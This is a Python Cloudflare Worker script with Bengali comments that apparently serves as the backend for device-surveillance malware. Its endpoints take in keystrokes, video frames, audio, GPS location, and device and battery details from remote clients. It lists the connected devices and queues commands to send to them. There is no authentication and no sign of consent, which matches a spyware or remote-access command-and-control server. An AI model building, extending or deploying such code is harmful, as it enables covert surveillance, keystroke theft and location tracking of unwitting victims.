from workers import WorkerEntrypoint, Response
from urllib.parse import urlparse
import json
import time

clients = {}

class Default(WorkerEntrypoint):
    async def fetch(self, request):
        global clients
        url = urlparse(request.url)
        path = url.path.rstrip("/")

        cors_headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        }

        # ১. API রুট (ডেটা আপডেট)
        if path == "/api/update" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("id", "unknown_device")
                now = time.time()
                
                if client_id not in clients:
                    clients[client_id] = {}
                
                if "video_frame" in data:
                    clients[client_id]["video_frame"] = data["video_frame"]
                    clients[client_id]["video_time"] = data.get("time", "")
                elif "audio_data" in data:
                    clients[client_id]["audio_data"] = data["audio_data"]
                    clients[client_id]["audio_time"] = data.get("time", "")
                elif "keystrokes" in data:
                    clients[client_id]["keystrokes"] = data["keystrokes"]
                else:
                    clients[client_id].update({
                        "id": client_id,
                        "lat": data.get("lat"),
                        "lng": data.get("lng"),
                        "accuracy": data.get("accuracy", 0),
                        "device": data.get("device", "Unknown"),
                        "browser": data.get("browser", "Unknown"),
                        "battery": data.get("battery", "N/A"),
                        "charging": data.get("charging", "N/A"),
                        "lastSeen": data.get("time", ""),
                    })
                
                clients[client_id]["lastPing"] = now
                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        # ২. API রুট (ডিভাইস লিস্ট)
        if path == "/api/clients" and request.method == "GET":
            now = time.time()
            # ১৫ সেকেন্ডের বেশি পুরনো ডিভাইস রিমুভ করা
            active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 15}
            clients = active_clients
            return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})

        # ৩. API রুট (কমান্ড পাঠানো)
        if path == "/api/command" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("client_id")
                command = data.get("command")
                if client_id in clients:
                    clients[client_id]["command"] = command
                    return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
                return Response(json.dumps({"error": "Device not found"}), status=404, headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        if request.method == "OPTIONS":
            return Response("", headers=cors_headers)

        # ৪. PWA এবং HTML স্ট্যাটিক ফাইল (ASSETS বাইন্ডিং থেকে)
        return await self.env.ASSETS.fetch(request)
